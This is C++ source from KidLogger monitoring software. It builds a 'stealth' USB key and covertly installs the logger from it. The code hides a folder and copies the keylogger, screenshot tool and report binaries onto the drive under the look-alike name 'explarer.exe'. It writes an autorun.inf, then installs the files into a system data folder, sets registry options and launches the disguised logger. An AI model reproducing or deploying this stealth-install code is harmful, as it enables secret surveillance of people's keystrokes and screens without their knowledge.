#include "StdAfx.h"
#include <Userenv.h>

#define EXEC(x,y) ShellExecute(NULL,"open",x,y,NULL,SW_HIDE)


int is_file_folder(const TCHAR *pth)
{
	HANDLE hfind;
	
	WIN32_FIND_DATA wfd;

	hfind = FindFirstFile(pth,&wfd);
	if(!hfind || hfind==(HANDLE)-1)
		return 0;
	FindClose(hfind);
	return (((wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)==FILE_ATTRIBUTE_DIRECTORY)+1);
}


void make_stealth(TCHAR *to_path)
{
	CString pth(to_path);
	TCHAR tmp[256];
	int k=0;
	TCHAR mp[2048],*mf;

	GetModuleFileName(NULL,mp,2048);
	mf = _tcsrchr( mp, '\\');
	if(mf)
		(*(mf+1))=0;
	

	
	pth+="\\kidlogger";
	
	if(is_file_folder(CString(to_path)+"\\autorun.inf"))
		if(MessageBox(0,CString("The autorun.inf is already exist on ") + CString(to_path) + "\nWould you like to replace it?","KidLogger",MB_YESNO | MB_ICONWARNING)==IDNO)
			return;

	CreateDirectory(pth,NULL);
	if(is_file_folder(pth))
		k+=1;

	SetFileAttributes(pth,FILE_ATTRIBUTE_HIDDEN);
	EXEC("reg","export HKLM\\Software\\KidLogger " + pth + "\\opts.reg");
	k+=CopyFile(CString(mp) + "report.exe",pth+"\\report.exe",0);
	k+=CopyFile(CString(mp) +"kidlog.dll",pth+"\\kidlog.dll",0);
	k+=CopyFile(CString(mp) +"kidlogger.exe",pth+"\\explarer.exe",0);
	k+=CopyFile(CString(mp) +"sshoot.exe",pth+"\\sshoot.exe",0);
	
	k+=CopyFile(CString(mp) +"autorun.inf",CString(to_path)+"\\autorun.inf",0);
	if(k<5)
	{
		MessageBox(0,"Error - could not create KidLogger","ERROR",MB_OK | MB_ICONSTOP);
	}else
	{

		MessageBox(0,"KidLogger USB Key was created successfully","KidLogger",MB_OK | MB_ICONINFORMATION);
		ShellExecute(0,"open",to_path,"",pth,SW_SHOW);
	}


}

void copy_stealth()
{
	TCHAR cpth[2048];
	CString pth;
	DWORD sz=2048;
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	TCHAR mp[2048],*mf;

	GetModuleFileName(NULL,mp,2048);
	mf = _tcsrchr(mp, '\\');
	if(mf)
		(*(mf+1))=0;
	


    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );



	//GetAllUsersProfileDirectory(cpth,&sz);
	SHGetSpecialFolderPath(0,cpth,CSIDL_COMMON_APPDATA,1);
	
	pth.Format("%s\\explarer",cpth);
	CreateDirectory(pth,NULL);
	EXEC("reg","import "+CString(mp)+"opts.reg");
	CopyFile(CString(mp)+"report.exe",pth+"\\report.exe",0);
	CopyFile(CString(mp)+"kidlog.dll",pth+"\\kidlog.dll",0);
	CopyFile(CString(mp)+"explarer.exe",pth+"\\explarer.exe",0);
	CopyFile(CString(mp)+"sshoot.exe",pth+"\\sshoot.exe",0);
	WriteReg( HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "LogFilesPath", pth+"\\");
	WriteReg(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\KidLogger") , "SafeLogger", (DWORD)0);
	//EXEC("REG","ADD HKLM\\SOFTWARE\\KidLogger /v \"LogFilesPath\" /d \"" + pth+"\\\" /f");

	CreateProcess(NULL,(char *)(const char *)(pth+"\\explarer.exe /init"),NULL,NULL,0,0,NULL,pth,&si,&pi);
	mf = strstr(mp,"\\");
	if(mf)
		(*(mf+1))=0;
	
	ShellExecute(0,"open",mp,"",mp,SW_SHOW);
}